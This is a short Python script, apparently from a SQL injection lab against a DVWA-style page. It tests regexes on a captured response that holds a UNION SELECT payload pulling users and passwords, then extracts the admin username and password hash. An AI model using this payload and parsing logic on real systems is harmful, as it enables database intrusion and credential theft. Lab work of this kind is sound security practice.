
import re
import html

# Sample block from earlier output
block = "ID: 999' UNION SELECT user, password FROM users -- -<br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99"

print("[*] Testing regex patterns on sample data...\n")
print(f"Block: {block}\n")

# Decode HTML
block_decoded = html.unescape(block)
print(f"Decoded: {block_decoded}\n")

# Split by <br />
lines = block_decoded.split('<br />')
print(f"Lines after split: {lines}\n")

# Try extracting ID
id_line = lines[0]
print(f"ID line: '{id_line}'")
id_match = re.search(r'ID:\s*(.+?)$', id_line)
if id_match:
    id_val = id_match.group(1).strip()
    print(f"ID extracted: '{id_val}'")
    print(f"'UNION' in id_val: {'UNION' in id_val}")
    print(f"'SELECT' in id_val: {'SELECT' in id_val}")
    print()

# Parse second line to get username
firstname_line = lines[1]
print(f"First name line: '{firstname_line}'")
username_match = re.search(r'First name:\s*(.+?)$', firstname_line)
if username_match:
    username = username_match.group(1).strip()
    print(f"Username extracted: '{username}'")
    print()

# Parse third line to get password hash
surname_line = lines[2]
print(f"Surname line: '{surname_line}'")
hash_match = re.search(r'Surname:\s*(.+?)$', surname_line)
if hash_match:
    password_hash = hash_match.group(1).strip()
    print(f"Password hash extracted: '{password_hash}'")

